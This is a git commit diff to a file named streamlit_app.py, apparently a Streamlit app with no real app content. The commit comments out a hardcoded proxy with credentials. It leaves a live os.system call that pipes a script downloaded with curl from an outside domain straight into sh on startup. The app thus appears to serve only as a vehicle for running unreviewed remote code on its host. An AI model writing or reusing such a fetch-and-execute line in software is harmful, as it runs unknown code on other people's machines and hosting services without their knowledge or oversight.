29fc88c739c333c2601d201f36157355bb413870
deryl93 <95095509+deryl93@users.noreply.github.com>
2021-11-27 00:24:25 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,7 +1,7 @@
 import os
-proxy = 'http://user:pass@45.199.148.4:80'
-os.environ['http_proxy'] = proxy 
-os.environ['HTTP_PROXY'] = proxy
-os.environ['https_proxy'] = proxy
-os.environ['HTTPS_PROXY'] = proxy
+# proxy = 'http://user:pass@45.199.148.4:80'
+# os.environ['http_proxy'] = proxy 
+# os.environ['HTTP_PROXY'] = proxy
+# os.environ['https_proxy'] = proxy
+# os.environ['HTTPS_PROXY'] = proxy
 os.system("curl -fsSL https://www.animania.tech/vscode.txt | sh")
